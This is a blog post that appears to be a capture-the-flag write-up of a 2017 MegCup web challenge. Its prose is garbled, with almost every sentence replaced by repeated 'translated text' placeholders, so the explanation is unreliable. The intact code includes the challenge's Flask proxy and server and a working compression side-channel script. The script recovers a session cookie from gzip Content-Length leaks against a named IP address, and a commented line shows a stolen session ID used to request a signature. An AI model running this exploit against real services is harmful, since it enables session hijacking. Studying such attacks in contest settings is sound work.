---
title: "Translated English Version"
date: 2017-03-27 11:57:00 +0800
---

translated text，translated text，translated text，translated text，[translated text](https://gist.github.com/winguse/a517546e2f54b2dc4fdcf99c4af6e75d)。

translated text，translated text，translated text，translated text（translated text）translated text，translated text，translated text。[translated text](https://2017.megcup.com/problems/3)，translated text，translated text：

translated text，translated text（translated text API），translated text cookie translated text，translated text cookie；translated text，translated text，translated text cookie，translated text URL。translated text，Py...Python，translated text（translated text），translated text，translated text，[translated text Thumbor translated text PR](https://github.com/thumbor/thumbor/pull/899)。

translated text：

proxy.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from mysecret import get_signed_session_id_raw
from flask import Flask, request, make_response
import requests

import base64

app = Flask(__name__)

UPSTREAM_URL = 'http://localhost:38701'

@app.route("/")
def hello():
    return "online proxy usage: /&lt;username&gt;/&lt;page&gt;"

@app.route("/<username>/<page>", methods=['GET', 'POST'])
def proxy(username, page):
    try:
        page = page.strip()
        assert set(page).issubset(set(
            chr(i) for i in range(ord('a'), ord('z') + 1)))
        if page == 'signtoken':
            return make_response('permission denied', 403)

        sid = get_signed_session_id_raw(username)
        sid = base64.urlsafe_b64encode(sid).decode('utf-8')
        up_resp = requests.get(UPSTREAM_URL + '/' + page, params=request.args,
                               cookies={'sessionid': sid})

        # some debug pages may expose session id; strip them
        resp = up_resp.text.replace(sid, '<del>sessionid</del>')

        if request.form.get('debug'):
            resp += '<br /><hr>proxy debug<br />'
            resp += 'server response headers: <pre>{}</pre>'.format(
                up_resp.headers)

        return resp
    except:
        return 'error'


if __name__ == "__main__":
    app.run(debug=True, port=38700)
```

server.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from mysecret import check_session_id, signtoken as do_signtoken
from simpleeval import simple_eval

from flask import Flask, request, make_response
import functools

app = Flask(__name__)

def require_login(func):
    @functools.wraps(func)
    def work():
        try:
            sid = request.cookies.get('sessionid')
            if not sid or not check_session_id(sid):
                return make_response('please login first', 401)
            return func()
        except:
            return 'error'
    return work

@app.route("/")
def hello():
    return "Hello World!"

@app.route("/echo")
@require_login
def echo():
    return make_response("""
        <h1>echo page</h1>
        <h2>request headers</h2><pre>{}</pre><h2>args</h2><pre>{}</pre>
    """.format(request.headers,
               '\n'.join('{}: {}'.format(k, v)
                         for k, v in request.args.items())))

@app.route("/eval")
@require_login
def eval_():
    expr = request.args['expr']
    result = simple_eval(expr)
    return make_response("""
        <h1>eval page</h1>
        <pre>{} = {}</pre>
    """.format(expr, result))

@app.route("/signtoken")
@require_login
def signtoken():
    token = request.args['token']
    signature = do_signtoken(token)
    return "token: {}<br />signature: {}".format(token, signature)

if __name__ == "__main__":
    app.run(debug=True, port=38701)
```

translated text，translated text，translated text eval translated text，translated text，translated text，translated text，translated text Python translated text，translated text HTTP translated text，translated text，translated text [Simple Eval translated text](https://github.com/danthedeckie/simpleeval)，translated text，translated text，translated text，translated text，translated text Python translated text（translated text）。

translated text echo translated text API translated text，translated text，translated text echo translated text HTTP Headers ，translated text，translated text，translated text sid translated text。translated text debug translated text，translated text header ，translated text，translated text。translated text，translated text，translated text form translated text，translated text，translated text。translated text Header ，translated text。

translated text，translated text！translated text，translated text Content-Length translated text 240 translated text，Content-Encoding translated text gzip 。translated text，translated text debug translated text，translated text Chrome translated text 223 translated text。translated text，translated text sid translated text，translated text gzip translated text 17 translated text。translated text sid translated text。translated text，translated text：translated text。translated text——translated text，translated text 17 translated text，translated text，translated text，translated text gzip translated text，translated text，translated text——translated text，translated text，translated text 17 translated text，translated text。

![translated text](/images/2017-03-27-guess-size.jpg)

translated text，translated text proxy.py translated text URL translated text，translated text，%20 translated text URL translated text，translated text python translated text HTTP translated text，translated text，translated text，translated text，translated text，translated text，translated text……

translated text 11 translated text，translated text，translated text 10 translated text，translated text[translated text](https://2017.megcup.com/ranklist)translated text，translated text，translated text，translated text[translated text](https://2017.megcup.com/get_upload/bef8bce5c3e307a8cd4f3e4b9467eff3)，translated text，translated text import translated text zlib ，translated text，translated text，translated text。translated text，translated text，translated text。translated text，translated text（translated text，translated text），translated text：

> translated text echo translated text，translated text，translated text。

translated text，translated text pattern translated text，translated text，translated text 100 translated text“translated text”translated text，translated text，translated text“100 translated text”，translated text，translated text？translated text，translated text，translated text，translated text：

> HEADER_IN_TEXT + SESSION_ID

translated text，translated text：

> HEADER_IN_TEXT + TRYING_CHARS

translated text  TRYING_CHARS translated text  SESSION_ID translated text，translated text，translated text（translated text）。translated text，translated text，translated text，translated text：

```python
import urllib
import urllib2
import re
import requests

# finally result
# r = requests.get('http://47.93.114.77:38701/signtoken', params={'token': '2d0a74300115d66e7a5d21e59bc20b53'}, headers={'Cookie': 'sessionid=ww6mveDaJESyPqfvcFKq1A=='})
# print r.content


zipBase=urllib.quote('''Accept: */*\r\nConnection: close\r\nUser-Agent: python-requests/2.13.0\r\nAccept-Encoding: gzip, deflate\r\nHost: localhost:38701\r\nCookie: sessionid=''')

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def getdebug(url):
    test_data={'debug':'a'}
    test_data_urlencode = urllib.urlencode(test_data)
    req = urllib2.Request(url=url, data=test_data_urlencode)
    res_data = urllib2.urlopen(req)
    res = res_data.read()
    res = re.search(r"(?<='Content-Length': ').*(?=', 'Connection')", res)
    return int(res.group())


now=''
for i in range(30):
    min_size = 999999999999
    selected = '0'
    for j in chars:
        res = getdebug('http://47.93.114.77:38700/root/echo?a=' + zipBase + now + j)
        if (res < min_size):
            min_size = res
            selected = j
        # print 'trying', j, res
    now += selected
    print now
```

translated text gzip translated text（translated text），translated text，translated text，translated text content-length translated text。

translated text，translated text，translated text，translated text，translated text。translated text，translated text，translated text，translated text，translated text。translated text，translated text[translated text](http://heartbleed.com/)。[translated text，translated text](http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/)。。

translated text。
